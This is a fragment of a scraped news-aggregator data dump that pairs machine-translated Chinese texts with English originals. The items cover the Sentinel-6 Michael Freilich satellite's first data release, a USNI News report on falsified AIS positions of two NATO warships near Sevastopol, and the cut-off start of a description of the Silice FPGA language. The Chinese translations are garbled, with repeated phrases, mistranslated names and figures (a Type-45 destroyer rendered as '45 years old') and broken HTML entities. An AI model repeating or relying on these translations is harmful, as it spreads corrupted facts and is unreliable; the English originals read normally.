Freilich\u6536\u96c6\u5b83\u65f6\uff0c\u5c06\u5728\u5c0f\u65f6\u5185\u63d0\u4f9b\u3002\u7b2c\u4e8c\u4e2a\u6570\u636e\u6d41\uff0c\u51c6\u786e\u52301.4\u82f1\u5bf8\uff083.5\u5398\u7c73\uff09\uff0c\u5c06\u5728\u6536\u96c6\u540e\u4e24\u5929\u53d1\u5e03\u3002\u5f53\u4ea7\u54c1\u53d8\u5f97\u53ef\u7528\u7684\u5dee\u5f02\uff0c\u4ee5\u9884\u6d4b\u548c\u5e2e\u52a9\u76d1\u6d4b\u98d3\u98ce\u7684\u5f62\u6210\u7b49\u4efb\u52a1\u7684\u4ea4\u4ed8\u65f6\u95f4\u4f59\u91cf\u3002\u66f4\u591a\u7684\u6570\u636e\u96c6\uff0c\u8be5\u6570\u636e\u96c6\u5c06\u51c6\u786e\u5230\u7ea61.2\u82f1\u5bf8\uff082.9\u5398\u7c73\uff09\uff0c\u5728\u4eca\u5e74\u665a\u4e9b\u65f6\u5019\u5206\u53d1\uff0c\u65e8\u5728\u7528\u4e8e\u7814\u7a76\u6d3b\u52a8\u548c\u6c14\u5019\u79d1\u5b66\uff0c\u5305\u62ec\u8ddf\u8e2a\u5168\u7403\u5e73\u5747\u6d77\u5e73\u9762\u4e0a\u5347\u3002\n  \u536b\u661f\uff0c\u4ee5\u524dNASA\u5730\u7403\u79d1\u5b66\u90e8\u4e3b\u4efbMichael Freilich\u547d\u540d\uff0c\u6536\u96c6\u5176\u6d4b\u91cf\u7ea6\u4e3a\u4e16\u754c\u768490\uff05\uff06\uff0339;\u6d77\u6d0b\u3002\u5b83\u662f\u64b0\u5199\u54e5\u767d\u5c3cSentinel-6 / Jason-CS\uff08\u670d\u52a1\u7684\u8fde\u7eed\u6027\uff09\u4efb\u52a1\u7684\u4e24\u9897\u536b\u661f\u4e4b\u4e00\u3002\u7b2c\u4e8c\u9897\u536b\u661f\uff0c\u54e8\u5175-6B\u662f\u57282025\u5e74\u63a8\u51fa\u7684\u3002\u5b83\u4eec\u5728\u4e00\u8d77\uff0c\u5b83\u4eec\u662f\u4e00\u7cfb\u5217\u7684\u822a\u5929\u5668\uff0c\u4e8e1992\u5e74\u4ee5Topex / Poseidon\u5f00\u5934\uff0c\u5e76\u7ee7\u7eed\u6301\u6709\u4e00\u7cfb\u5217\u536b\u661f\uff0c\u8fd9\u4e9b\u536b\u661f\u5df2\u7ecf\u6536\u96c6\u7cbe\u786e\u7684\u6d77\u6d0b\u9ad8\u5ea6\u6d4b\u91cf\u8fd130\u5e74\u3002\n  \u53d1\u5e03\u540e\u4e0d\u4e45\uff0cSentinel-6 Michael Freilich\u8fdb\u5165\u4e86\u4f4d\u7f6e\uff0c\u843d\u540e\u4e8e\u5f53\u524d\u53c2\u8003\u6d77\u5e73\u9762\u536b\u661fJason-3\u523030\u79d2\u3002\u7136\u540e\uff0c\u79d1\u5b66\u5bb6\u548c\u5de5\u7a0b\u5e08\u82b1\u8d39\u65f6\u95f4\u4ea4\u53c9\u6821\u51c6\u4e24\u9897\u536b\u661f\u6536\u96c6\u7684\u6570\u636e\uff0c\u4ee5\u786e\u4fdd\u4e24\u8005\u4e4b\u95f4\u7684\u6d4b\u91cf\u7684\u8fde\u7eed\u6027\u3002\u4e00\u65e6\u4ed6\u4eec\u786e\u4fe1\u6570\u636e\u8d28\u91cf\uff0cSentinel-6 Michael Freilich\u5c06\u6210\u4e3a\u4e3b\u8981\u6d77\u5e73\u9762\u536b\u661f\u3002\n  \uff06\uff0334;\u5b83\uff06\uff0339;\u77e5\u9053\u536b\u661f\u6b63\u5728\u5de5\u4f5c\uff0c\u6570\u636e\u770b\u8d77\u6765\u5f88\u597d\uff0c\uff06\uff0334; Josh Willis\u8868\u793a\uff0c\u7f8e\u56fd\u5b87\u822a\u5c40\u7684\u9879\u76ee\u79d1\u5b66\u5bb6\uff06\uff0339;\u52a0\u5dde\u5357\u90e8\u7684\u55b7\u5c04\u63a8\u8fdb\u5b9e\u9a8c\u5ba4\u3002 \uff06\uff0334;\u51e0\u4e2a\u6708\u5230\u73b0\u5728\uff0cSentinel-6 Michael Freilich\u5c06\u63a5\u7ba1\u5176\u524d\u8eabjason-3\uff0c\u8fd9\u4e2a\u6570\u636e\u53d1\u5e03\u662f\u8be5\u8fc7\u7a0b\u7684\u7b2c\u4e00\u6b65\u3002\uff06\uff0334;\n      \u901a\u8fc7\u589e\u52a0\u6e29\u5ba4\u6c14\u4f53\u6d53\u5ea6\uff0c\u6d77\u6d0b\u5438\u6536\u8d85\u8fc790\uff05\u7684\u70ed\u91cf\uff0c\u5bfc\u81f4\u6d77\u6c34\u6269\u5f20\u548c\u6d77\u5e73\u9762\u4e0a\u5347\u3002\u76d1\u6d4b\u6d77\u6d0b\u9ad8\u5ea6\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u5b83\u6709\u52a9\u4e8e\u9884\u6d4b\u5458\u9884\u6d4b\u4e8b\u7269\uff0c\u5305\u62ec\u6d77\u6d0b\u7535\u6d41\u548c\u6f5c\u5728\u7684\u98d3\u98ce\u5f3a\u5ea6\u3002\n  \uff06\uff0334;\u8fd9\u4e9b\u521d\u59cb\u6570\u636e\u663e\u793a\uff0cSentinel-6 Michael Freilich\u662f\u4e00\u4e2a\u60ca\u4eba\u7684\u65b0\u5de5\u5177\uff0c\u6709\u52a9\u4e8e\u6539\u5584\u6d77\u6d0b\u548c\u5929\u6c14\u9884\u62a5\uff0c\uff06\uff0334;\u9a6c\u91cc\u5170\u5dde\u56fd\u5bb6\u6d77\u6d0b\u548c\u5927\u6c14\u7ba1\u7406\u5c40\u7684Eric Leuliette\uff0c\u8ba1\u5212\u548c\u9879\u76ee\u79d1\u5b66\u5bb6\u3002 \uff06\uff0334;\u5728\u4e00\u4e2a\u53d8\u5316\u7684\u6c14\u5019\uff0c\u5b83\uff06\uff0339;\u8fd9\u4e00\u6570\u636e\u51c6\u5907\u597d\u53d1\u5e03\u7684\u4f1f\u5927\u6210\u5c31\u3002\uff06\uff0334;\n  Ocean Altimetry\u8ba1\u5212\u7ecf\u7406Julia Figa Eumetsat\uff08\u6b27\u200b\u200b\u6d32\u5265\u524a\u6c14\u8c61\u536b\u661f\u7ec4\u7ec7\uff09\uff0c\u8865\u5145\u8bf4\uff0c\u6765\u81ea\u8fd9\u79cd\u72ec\u7279\u7684\u6d77\u6d0bAltiMetry Mission\u7684\u7b2c\u4e00\u4e2a\u6570\u636e\u6d41\u7684\u64cd\u4f5c\u91ca\u653e\u662f\u5927\u897f\u6d0b\u98d3\u98ce\u5b63\u8282\u5f00\u59cb\u7684\u91cd\u8981\u91cc\u7a0b\u7891\u3002 \n\uff06\uff0334;\u5728\u8fbe\u59c6\u65bd\u5854\u7279\u7684Eumesat\u603b\u90e8\u6b63\u5728\u4ece\u8fbe\u59c6\u65bd\u5854\u7279\u7684Eumesat\u603b\u90e8\u5904\u7406\uff0c\u4ece\u90a3\u91cc\uff0c\u536b\u661f\u4e5f\u88ab\u63a7\u5236\uff0c\u5e76\u91ca\u653e\u5230\u4e16\u754c\u5404\u5730\u7684\u6d77\u6d0b\u548c\u5929\u6c14\u9884\u62a5\u6570\u636e\u7528\u6237\uff0c\u4ee5\u83b7\u5f97\u4ed6\u4eec\u7684\u8fd0\u8425\u7528\u6cd5\uff0c\uff06\uff0334; Saldana\u8bf4\u3002\n  \u79d1\u5b66\u5bb6\u4eec\u8fd8\u9884\u8ba1\u4f7f\u7528\u6570\u636e\u6765\u89c4\u8303\uff0c\u56e0\u4e3a\u6c14\u5019\u53d8\u5316\uff0c\u6d77\u5e73\u9762\u7684\u5feb\u901f\u5347\u9ad8\u3002\u6e29\u6696\u6d77\u6c34\u7684\u6269\u5f20\u5360\u73b0\u4ee3\u6d77\u5e73\u9762\u4e0a\u6da8\u7684\u7ea6\u4e09\u5206\u4e4b\u4e00\uff0c\u800c\u51b0\u5ddd\u548c\u51b0\u5e8a\u7684\u7194\u878d\u6c34\u5360\u5176\u4f59\u7684\u3002\u5728\u8fc7\u53bb\u7684\u4e8c\u5341\u5e74\u91cc\uff0c\u6d77\u6d0b\u4e0a\u5347\u7684\u901f\u5ea6\u52a0\u901f\u4e86\uff0c\u7814\u7a76\u4eba\u5458\u5e0c\u671b\u5728\u672a\u6765\u51e0\u5e74\u5185\u52a0\u5feb\u66f4\u591a\u5730\u52a0\u5feb\u66f4\u591a\u3002\u6d77\u5e73\u9762\u4e0a\u5347\u5c06\u6539\u53d8\u6d77\u5cb8\u7ebf\u5e76\u589e\u52a0\u6f6e\u6c50\u548c\u98ce\u66b4\u7684\u6d2a\u6c34\u3002\u4e3a\u4e86\u66f4\u597d\u5730\u4e86\u89e3\u6d77\u6d0b\u5982\u4f55\u5f71\u54cd\u4eba\u6027\uff0c\u7814\u7a76\u4eba\u5458\u9700\u8981\u957f\u671f\u7684\u6c14\u5019\u8bb0\u5f55 -  Sentinel-6 Michael Freilich\u5c06\u6709\u52a9\u4e8e\u63d0\u4f9b\u3002\n    Sentinel-6 / Jason-CS\u7531ESA\uff08\u6b27\u6d32\u822a\u5929\u5c40\uff09\uff0cEumetsat\uff0cNASA\u548cNOAA\u5171\u540c\u5f00\u53d1\uff0c\u6765\u81ea\u6b27\u6d32\u59d4\u5458\u4f1a\u548c\u6cd5\u56fd\u7684\u6280\u672f\u652f\u6301\u548c\u56fd\u5bb6\u7a7a\u95f4\u7814\u7a76\u4e2d\u5fc3\u7684\u8d44\u91d1\u652f\u6301\u3002\n  JPL\u662f\u5e15\u8428\u8fea\u7eb3\u7684CALTECH\u7684\u4e00\u4e2a\u90e8\u95e8\uff0c\u6b63\u5728\u4e3a\u6bcf\u4e2aSentinel-6\u536b\u661f\u63d0\u4f9b\u4e09\u79cd\u79d1\u5b66\u4eea\u5668\uff1a\u5148\u8fdb\u7684\u5fae\u6ce2\u8f90\u5c04\u8ba1\uff0c\u5168\u7403\u5bfc\u822a\u536b\u661f\u7cfb\u7edf - \u65e0\u7ebf\u7535\u63a9\u661f\u548c\u6fc0\u5149\u53cd\u5411\u53cd\u5c04\u4eea\u9635\u5217\u3002\u7f8e\u56fd\u5b87\u822a\u5c40\u8fd8\u5728\u8d21\u732e\u53d1\u5c04\u670d\u52a1\uff0c\u5730\u9762\u7cfb\u7edf\u652f\u6301NASA\u79d1\u5b66\u4eea\u5668\u7684\u8fd0\u884c\uff0c\u8fd9\u4e24\u4e2a\u4eea\u5668\u7684\u79d1\u5b66\u6570\u636e\u5904\u7406\u5668\uff0c\u4ee5\u53ca\u5bf9\u7f8e\u56fd\u56fd\u9645\u6d77\u9762\u5730\u5f62\u79d1\u5b66\u56e2\u961f\u7684\u7f8e\u56fd\u6210\u5458\u7684\u652f\u6301\u3002\u5f15\u6587\uff1a\u4e3b\u8981\u6d77\u6d0b\u89c2\u6d4b\u536b\u661f\u5f00\u59cb\u63d0\u4f9b\u79d1\u5b66\u6570\u636e\uff082021\u5e74\uff0c6\u670821\u65e5\uff09\u4eceHttps://phys.org/news/2021-06-major-ocean-observing-satellite-science.html\n  \u672c\u6587\u4ef6\u53d7\u7248\u6743\u4fdd\u62a4\u3002\u9664\u4e86\u79c1\u4eba\u5b66\u4e60\u6216\u7814\u7a76\u76ee\u7684\u7684\u4efb\u4f55\u516c\u5e73\u4ea4\u6613\u5916\uff0c\u6ca1\u6709\u4e66\u9762\u8bb8\u53ef\uff0c\u6ca1\u6709\u4efb\u4f55\u90e8\u5206\u3002\u5185\u5bb9\u4ec5\u4f9b\u53c2\u8003\u3002 ", "note_en": "After six months of check-out and calibration in orbit, the Sentinel-6 Michael Freilich satellite will make its first two data streams available to the public on June 22. It launched from Vandenberg Air Force Base in California on Nov. 21, 2020, and is a U.S.-European collaboration to measure sea surface height and other key ocean features, such as ocean surface wind speed and wave height.    One of the sea surface height   that will be released is accurate to 2.3 inches (5.8 centimeters) and will be available within hours of when the instruments aboard Sentinel-6 Michael Freilich collect it. A second stream of data, accurate to 1.4 inches (3.5 centimeters), will be released two days after collection. The difference in when the products become available balances accuracy with delivery timeliness for tasks like forecasting the   and helping to monitor the formation of hurricanes. More datasets, which will be accurate to about 1.2 inches (2.9 centimeters), are slated for distribution later this year and are intended for research activities and climate science including tracking global mean sea level rise.\n  The satellite, named after former NASA Earth Science Division Director Michael Freilich, collects its measurements for about 90% of the world&#39;s oceans. It is one of two satellites that compose the Copernicus Sentinel-6/Jason-CS (Continuity of Service) mission. The second satellite, Sentinel-6B, is slated for launch in 2025. Together, they are the latest in a series of spacecraft starting with TOPEX/Poseidon in 1992 and continuing with the Jason series of satellites that have been gathering precise ocean height measurements for nearly 30 years.\n  Shortly after launch, Sentinel-6 Michael Freilich moved into position, trailing the current reference sea level satellite Jason-3 by 30 seconds. Scientists and engineers then spent time cross-calibrating the data collected by both satellites to ensure the continuity of measurements between the two. Once they have are assured of the data quality, Sentinel-6 Michael Freilich will then become the primary sea level satellite.\n  &#34;It&#39;s a relief knowing that the satellite is working and that the data look good,&#34; said Josh Willis, project scientist at NASA&#39;s Jet Propulsion Laboratory in Southern California. &#34;Several months from now, Sentinel-6 Michael Freilich will take over for its predecessor, Jason-3, and this data release is the first step in that process.&#34;\n      The ocean absorbs more than 90% of the heat trapped in the Earth system by increasing concentrations of greenhouse gases, which causes seawater to expand and sea level to rise. Monitoring ocean height is important because it helps forecasters predict things, including ocean currents and potential hurricane strength.\n  &#34;These initial data show that Sentinel-6 Michael Freilich is an amazing new tool that will help to improve marine and weather forecasts,&#34; said Eric Leuliette, program and project scientist at the National Oceanic and Atmospheric Administration in Maryland. &#34;In a changing climate, it&#39;s a great achievement that these data are ready for release.&#34;\n  Ocean Altimetry Programme Manager Julia Figa Saldana of EUMETSAT (European Organisation for the Exploitation of Meteorological Satellites), added that the operational release of the first data streams from this unique ocean altimetry mission was a significant milestone at the start of the Atlantic hurricane season.\n  &#34;The altimetry data are now being processed at EUMESAT headquarters in Darmstadt, from where the satellite is also being controlled, and released to ocean and weather forecasting data users around the world for their operational usage,&#34; Saldana said.\n  Scientists also anticipate using the data to gauge how fast sea levels are rising because of climate change. The expansion of warm seawater accounts for about one-third of modern-day sea level rise, while meltwater from glaciers and ice sheets accounts for the rest. The rate at which the oceans are rising has accelerated over the past two decades, and researchers expect it to speed up more in the years to come. Sea level rise will change coastlines and increase flooding from tides and storms. To better understand how rising seas will impact humanity, researchers need long climate records\u2014something Sentinel-6 Michael Freilich will help provide.\n    Sentinel-6/Jason-CS is being jointly developed by ESA (European Space Agency), EUMETSAT, NASA, and NOAA, with funding support from the European Commission and technical support from France&#39;s National Centre for Space Studies.\n  JPL, a division of Caltech in Pasadena, is contributing three science instruments for each Sentinel-6 satellite: The Advanced Microwave Radiometer, the Global Navigation Satellite System\u2014Radio Occultation, and the Laser Retroreflector Array. NASA is also contributing launch services, ground systems supporting operation of the NASA science instruments, the science data processors for two of these instruments, and support for the U.S. members of the international Ocean Surface Topography Science Team.             Citation: Major ocean-observing satellite starts providing science data (2021, June 21) retrieved 22 June 2021 from https://phys.org/news/2021-06-major-ocean-observing-satellite-science.html\n  This document is subject to copyright. Apart from any fair dealing for the purpose of private study or research, no part may be reproduced without the written permission. The content is provided for information purposes only.", "posttime": "2021-06-22 18:21:20", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u89c2\u6d4b,ocean,\u6d77\u6d0b", "title": "\u4e3b\u8981\u6d77\u6d0b\u89c2\u6d4b\u536b\u661f\u5f00\u59cb\u63d0\u4f9b\u79d1\u5b66\u6570\u636e ", "title_en": "Major Ocean-Observing Satellite Starts Providing Science Data", "transed": 1, "url": "https://phys.org/news/2021-06-major-ocean-observing-satellite-science.html", "via": "", "real_tags": ["\u89c2\u6d4b", "ocean", "\u6d77\u6d0b"]}, {"category": "", "categoryclass": "", "imagename": "546f3149ebe86f7f6051c58e2501cf9b.jpg", "infoid": 1067403, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Usni News\u5df2\u7ecf\u5b66\u4f1a\u4e86\uff0c\u4e24\u4e2a\u5317\u7ea6\u519b\u8230\u7684\u8ffd\u8e2a\u6570\u636e\u88ab\u4f2a\u9020\u4e86\u4fc4\u7f57\u65af\u5bf9\u7167\u6d77\u519b\u57fa\u5730\u7684\u6d77\u5cb8\uff0c\u800c\u5b9e\u9645\u7684\u8239\u53ea\u5df2\u7ecf\u505c\u6cca\u4e86180\u82f1\u91cc\uff0cUsni\u65b0\u95fb\u5df2\u7ecf\u4e86\u89e3\u5230\u4e86\u3002\u82f1\u56fd\u7687\u5bb6\u6d77\u519b\u7684HMS Defender\u662f\u4e00\u6b3e45\u5c81\u7684Daring-Class Destroyer\uff0c\u4ee5\u53caRoyal Netherlands Navy\u7684HNLMS Evertsen\uff0cAdzevenProvinci\u00ebn-Class Priatial\uff0c\u4e8e6\u670818\u65e5\u5728\u4e4c\u514b\u5170\u62c9\u5165Odessa\u3002\u8be5\u96c6\u56e2\u88ab\u4fc4\u7f57\u65af\u6218\u8230\u76d1\u6d4b\u6839\u636e\u7f8e\u56fd\u6d77\u519b\u7167\u7247\u7684\u8bf4\u6cd5\uff0c\u5728\u9ed1\u6d77\u4e2d\u953b\u70bc\u57286\u670817\u65e5\u3002\n \u6839\u636e\u81ea\u52a8\u8bc6\u522b\u7cfb\u7edf\uff08AIS\uff09\u4fe1\u53f7\uff0c\u5b83\u4f20\u8f93\u4f4d\u7f6e\u7ec6\u8282\uff0c\u4ee5\u63d0\u9ad8\u6d77\u4e0a\u5b89\u5168\u6027\uff0c\u8fd9\u5bf9\u82e5\u8981\u57286\u670818\u65e5\u5348\u591c\u4e4b\u524d\u79bb\u5f00\u4e86Odessa\u3002\u6570\u636e\u663e\u793a\u4ed6\u4eec\u76f4\u63a5\u822a\u884c\u5230\u585e\u74e6\u65af\u6258\u6ce2\u5c14\uff0c\u63a5\u8fd1\u6e2f\u6e7e\u7684\u4e24\u6d77\u91cc\u822a\u6d77\u5165\u53e3\u3002\u6218\u7565\u6e2f\u53e3\u8bbe\u6709\u4fc4\u7f57\u65af\u9ed1\u6d77\u8230\u961f\u7684\u603b\u90e8\u3002\n \u5c3d\u7ba1\u662fAIS\u8f68\u9053\uff0c\u4f46\u6709\u660e\u786e\u7684\u8bc1\u636e\u8868\u660e\u8fd9\u4e24\u8258\u519b\u8230\u6ca1\u6709\u79bb\u5f00\u6556\u5fb7\u8428\u3002\u7136\u800c\uff0cLive\u7f51\u7edc\u6444\u50cf\u5934\u9972\u6599\u8868\u660e\u4ed6\u4eec\u6ca1\u6709\u79bb\u5f00\u6556\u5fb7\u8428\u3002\u65e0\u8bba\u5982\u4f55\uff0c\u8fd9\u662f\u56fd\u9632\u5708\u548c\u5f53\u5730\u5a92\u4f53\u7684\u5df2\u77e5\u60c5\u51b5\u3002\u6556\u5fb7\u8428\u7684\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u770b\u5230\u4ed6\u4eec\u6ca1\u6709\u79bb\u5f00\u3002\u7f51\u7edc\u6444\u50cf\u5934\u5728Odessa Online\u5e7f\u64ad\u4e3aYouTube\u800c\u76f4\u64ad\u3002\u50cfWindy.com\u8fd9\u6837\u7684\u7b2c\u4e09\u65b9\u5929\u6c14\u7f51\u7ad9\u5b58\u6863\u7684\u5c4f\u5e55\u622a\u56fe\u663e\u793a\u4e86Odessa\u7684\u4e24\u8258Warships\u8fc7\u591c\u3002\n \u6839\u636e\u4fc4\u7f57\u65af\u6d77\u519b\u5927\u57fa\u5730\u5165\u53e3\u5904\u7684\u5165\u53e3\u5904\u5b9a\u4f4d\u4e24\u4e2a\u5317\u7ea6\u519b\u8230\u5c06\u88ab\u5e7f\u6cdb\u88ab\u89c6\u4e3a\u4e00\u79cd\u6311\u8845\u884c\u52a8\uff0c\u57fa\u4e8e\u5bf9\u4e3b\u6743\u7684\u77db\u76fe\u7684\u4e3b\u5f20\u3002\u5176\u4e2d\u5927\u591a\u6570\u56fd\u9645\u793e\u4f1a\uff0c\u5305\u62ec\u7f8e\u56fd\uff0c\u82f1\u56fd\u548c\u8377\u5170\uff0c\u4e0d\u8ba4\u4e3a\u662f\u514b\u91cc\u7c73\u4e9a\u4f5c\u4e3a\u4fc4\u7f57\u65af\u7684\u4e00\u90e8\u5206\u3002\n  \u867d\u7136\u6b3a\u9a97\u7684\u52a8\u673a\u5c1a\u4e0d\u6e05\u695a\uff0c\u4f46\u8be5\u884c\u52a8\u63d0\u51fa\u4e86\u5173\u4e8e\u5f00\u6e90\u60c5\u62a5\u6570\u636e\uff08\u4f8b\u5982AIS\uff09\u7684\u6548\u679c\u7684\u95ee\u9898\uff0c\u8fd9\u5728\u9632\u5fa1\u548c\u8bb0\u8005\u4e2d\u53d8\u5f97\u8d8a\u6765\u8d8a\u666e\u904d\u3002\u6709\u4ee4\u4eba\u4fe1\u670d\u7684\u8bc1\u636e\u8868\u660eAIS\u8f68\u9053\u88ab\u4f2a\u9020\u3002\u5317\u7ea6\u4ee3\u8868\u6ca1\u6709\u7acb\u5373\u56de\u5e94\u8bc4\u8bba\u8bf7\u6c42\uff0c\u66f2\u76ee\u88ab\u8377\u5170\u6d77\u519b\u6218\u4e89\u65b0\u95fb\u7f51\u7ad9Marineschepen.nl\u3002\n AIS\u804c\u4f4d\u4e0eAIS\u805a\u5408\u5668Marinetraffic.com\u5728Chornomorsk\u7684\u63a5\u6536\u7ad9\u5206\u4eab\uff0c\u9760\u8fd1\u6556\u5fb7\u8428\u3002\u5176\u4ed6AIS\u805a\u5408\u5668\u8fd8\u62a5\u544a\u4e86\u5047\u804c\u4f4d\u3002\u5728\u5979\u76ee\u524d\u6b63\u5728\u4f7f\u7528\u7684\u51ed\u8bc1\u4e0b\u663e\u793aHMS\u540e\u536b\uff0cIMO 4907878.HNLMS Evertsen\u88ab\u62a5\u544a\u4e3a\u201c\u8377\u5170\u8230\u8239\u201d\uff0cMMSI 244942000\u3002\u76ee\u524d\u5c1a\u4e0d\u6e05\u695a\u9519\u8bef\u7684AIS\u6570\u636e\u5982\u4f55\u5f15\u5165\u9972\u6599\u3002\n \u8f7d\u4f53\u7f62\u5de5\u7ec4\u90fd\u662fCSG21\u7684\u4e00\u90e8\u5206\uff0c\u8be5\u90e8\u5206\u540e\u536b\u548cevertsen\u90fd\u4ee5HMS\u5973\u738b\u4f0a\u4e3d\u838e\u767d\uff08R08\uff09\u4e3a\u4e2d\u5fc3\u3002 CSG21\u7684\u4e3b\u4f53\u4ecd\u7136\u5728\u5730\u4e2d\u6d77\uff0c\u800c\u4e24\u8258\u4e34\u65f6\u90e8\u7f72\u5230\u9ed1\u6d77\u7684\u6218\u8230\uff0c\u5728\u90a3\u91cc\u4ed6\u4eec\u4e00\u76f4\u5728\u8fdb\u884c\u5bfc\u822a\u4efb\u52a1\u81ea\u7531\u5e76\u4e0e\u76df\u53cb\u953b\u70bc\u8eab\u4f53\u3002\u4ed6\u4eec\u8bbf\u95ee\u4e86\u571f\u8033\u5176\u548c\u4e4c\u514b\u5170\uff0c\u4e5f\u5c06\u4e0e\u7f57\u9a6c\u5c3c\u4e9a\u548c\u683c\u9c81\u5409\u4e9a\u4e00\u8d77\u953b\u70bc\u8eab\u4f53\u3002\u4ed6\u4eec\u8fd8\u9047\u5230\u4e86\u7f8e\u56fd\u6d77\u519b\u7684\u963f\u5229\u4f2f\u514b\u7ea7\u9a71\u9010\u8230USS Laboon\uff08DDG-58\uff09\u3002 ", "note_en": "The tracking data of two NATO warships was faked off the coast of a Russian controlled naval base in the Black Sea while the actual ships were moored 180 miles away, USNI News has learned.   The U.K. Royal Navy\u2019s HMS  Defender, a Type-45 Daring-class destroyer, and the Royal Netherlands Navy\u2019s HNLMS  Evertsen, a De Zeven Provinci\u00ebn-class frigate, pulled into Odessa in  Ukraine on June 18. The group had been monitored by Russian warships while exercising in the Black Sea, according to U.S. Navy photos dated on June 17.\n According to an automatic identification system (AIS) signal, which transmits position details to improve maritime safety, the pair left Odessa just before midnight on June 18. The data shows that they sailed directly to Sevastopol, approaching to within two nautical miles of the harbor entrance. The strategic port houses the headquarters of Russia\u2019s Black Sea fleet.\n Despite the AIS track, there is clear evidence that the two warships did not leave Odessa. Live webcam feeds show that they did not leave Odessa, however. This was anyway the known situation in defense circles, and local media.\u00a0Anyone in Odessa can see that they did not leave. The webcams are broadcast live  on YouTube by  Odessa Online. Screenshots archived by third party weather sites like  Windy.com show the two warships present in Odessa overnight.\n Positioning two NATO warships at the entrance at the entrance of a major Russian naval base would be widely seen as a provocative action, based on conflicting claims of sovereignty . Most of the international community, including the U.S, Britain and the Netherlands, do not recognize Crimea as part of Russia.\n  While the motives for the deception are unclear, the move raises questions about the efficacy of open-source intelligence data, such as AIS, which is becoming more common in both defense and by journalists. There is compelling evidence that the AIS tracks were faked. NATO representatives did not immediately respond to requests for comment and the tracks were confirmed as false by Dutch naval warfare news site  Marineschepen.nl.\n The AIS positions were shared with AIS aggregator MarineTraffic.com by a receiver station in Chornomorsk, close to Odessa. Other AIS aggregators also reported the false positions. HMS  Defender was shown under the credentials that she is currently using, IMO 4907878. HNLMS  Evertsen was reported as \u201cNetherlands Warship,\u201d MMSI 244942000. It is\u00a0unclear how the false AIS data was introduced to the feed.\n Both  Defender and  Evertsen are part of CSG21, the carrier strike group centered around HMS  Queen Elizabeth (R08). The main body of CSG21 has remained in the Mediterranean, while the two warships temporarily deployed to the Black Sea, where they have been performing freedom of navigation missions and exercising with allies. They have visited Turkey and Ukraine and will also exercise with Romania and Georgia. They have also met with the U.S. Navy\u2019s Arleigh Burke-class destroyer USS  Laboon (DDG-58).", "posttime": "2021-06-22 18:20:35", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u4fc4\u7f57\u65af,\u8239\u8236,nato,ais", "title": "\u4e24\u4e2a\u5317\u7ea6\u8239\u8236\u7684\u804c\u4f4d\u5728\u4fc4\u7f57\u65af\u9ed1\u6d77\u6d77\u519b\u57fa\u5730\u9644\u8fd1\u4f2a\u9020 ", "title_en": "Positions of Two NATO Ships Were Falsified Near Russian Black Sea Naval Base", "transed": 1, "url": "https://news.usni.org/2021/06/21/positions-of-two-nato-ships-were-falsified-near-russian-black-sea-naval-base", "via": "", "real_tags": ["\u4fc4\u7f57\u65af", "\u8239\u8236", "nato", "ais"]}, {"category": "", "categoryclass": "", "imagename": "953fd3dba031d2c49dc9d6c1bcf1f10e.png", "infoid": 1067402, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8981\u67e5\u770b\u53ef\u4ee5\u4f7f\u7528SILICE\u5b8c\u6210\u7684\u5185\u5bb9\uff0c\u8bf7\u7ed3\u5e10\u793a\u4f8b\u9879\u76ee\uff08\u6240\u6709\u8fd9\u4e9b\u90fd\u5728\u6b64\u56de\u8d2d\u4e2d\u63d0\u4f9b\uff09\u3002\n  \u91cd\u8981\u63d0\u793a\uff1a\u6700\u65b0\u53d8\u66f4\u53d1\u751f\u5728WIP\uff08\u6b63\u5728\u8fdb\u884c\u7684\u5de5\u4f5c\uff09\u548c\u8349\u6848\u5206\u652f\u673a\u6784\u4e2d\uff0c\u68c0\u67e5\u51fa\u6765\u4eab\u53d7\u6700\u65b0\u529f\u80fd\u3002\u9605\u8bfb\u66f4\u591a\u5173\u4e8e\u53d1\u5c55\u5206\u652f\u673a\u6784\u7684\u4fe1\u606f\u3002\n   siliice\u7b80\u5316\u4e86FPGA\u4e0a\u7684\u539f\u578b\u5316\u7b97\u6cd5\u3002\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e2a\u8212\u9002\u4f46\u8584\u7684\u62bd\u8c61\u4ee5\u4e0aVerilog\uff08\u5178\u578b\u7684\u786c\u4ef6\u63cf\u8ff0\u8bed\u8a00\uff09\uff0c\u7b80\u5316\u4e86\u8bbe\u8ba1\u800c\u4e0d\u4f1a\u5bf9\u786c\u4ef6\u8fdb\u884c\u7cbe\u786e\u63a7\u5236\u3002\u5b83\u63d0\u4f9b\uff06\uff0334;\u751f\u6d3b\u8d28\u91cf\uff06\uff0334;\u5206\u7ec4\u4fe1\u53f7\u7684\u529f\u80fd\uff0c\u5b9a\u4e49\u901a\u7528\u63a5\u53e3\u548c\u7535\u8def\uff0c\u5b9e\u4f8b\u5316\u5757RAM\uff0c\u63cf\u8ff0\u7ba1\u9053\uff0c\u5904\u7406\u591a\u4e2a\u65f6\u949f\u57df\u5e76\u81ea\u52a8\u7ba1\u7406Flip-flops.it\u7ed9\u51fa\uff08\u53ef\u9009\uff09\u5c06\u60a8\u7684\u8bbe\u8ba1\u7684\u90e8\u5206\u5199\u4e3a\u64cd\u4f5c\u5e8f\u5217\uff0c\u5b50\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\uff0c\u5e76\u4f7f\u7528\u8bf8\u5982\u867d\u7136\u548c\u4e2d\u65ad\u7684\u63a7\u5236\u6d41\u8bed\u53e5\uff0c\u63cf\u8ff0\u5e76\u884c\u8fd0\u884c\u7684\u64cd\u4f5c\u548c\u7b97\u6cd5\uff0c\u7cbe\u786e\u5730in sync.silice\u68c0\u6d4b\u7ec4\u5408\u5faa\u73af\u4ee5\u53ca\u8bb8\u591a\u5176\u4ed6\u9519\u8bef\u6613\u4e8e\u6613\u56e0\u7684\u60c5\u51b5\uff0c\u5e76\u5177\u6709\u542f\u7528\u9ad8\u7ea7\u7684Lua-pre\u5904\u7406\u5668\u4ee3\u7801\u751f\u6210\u3002\n 